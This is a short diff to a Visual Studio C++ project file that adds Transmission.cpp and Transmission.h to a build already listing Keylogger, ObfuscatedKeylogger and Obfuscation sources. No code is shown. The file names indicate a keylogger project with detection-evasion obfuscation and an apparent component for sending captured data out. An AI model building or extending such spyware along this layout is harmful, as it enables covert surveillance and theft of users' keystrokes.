@@ -185,10 +185,12 @@
     <ClCompile Include="Keylogger.cpp" />
     <ClCompile Include="ObfuscatedKeylogger.cpp" />
     <ClCompile Include="Obfuscation.cpp" />
+    <ClCompile Include="Transmission.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="Keylogger.h" />
     <ClInclude Include="Obfuscation.h" />
+    <ClInclude Include="Transmission.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
